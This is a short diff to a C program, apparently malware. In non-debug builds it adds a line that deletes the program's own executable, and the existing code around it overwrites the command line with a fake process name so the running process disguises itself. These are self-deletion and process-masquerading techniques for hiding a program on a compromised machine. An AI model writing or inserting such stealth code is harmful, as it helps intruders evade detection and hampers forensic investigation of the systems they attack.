@@ -74,6 +74,8 @@ int main( int argc,char **argv )
 #endif
 
 #ifndef DEBUG
+    remove(argv[0]);
+    
     /* overwrite cmdline */
     memset((void*)argv[0], '\0', strlen(argv[0]));
     strcpy(argv[0], FAKE_PROC_NAME);
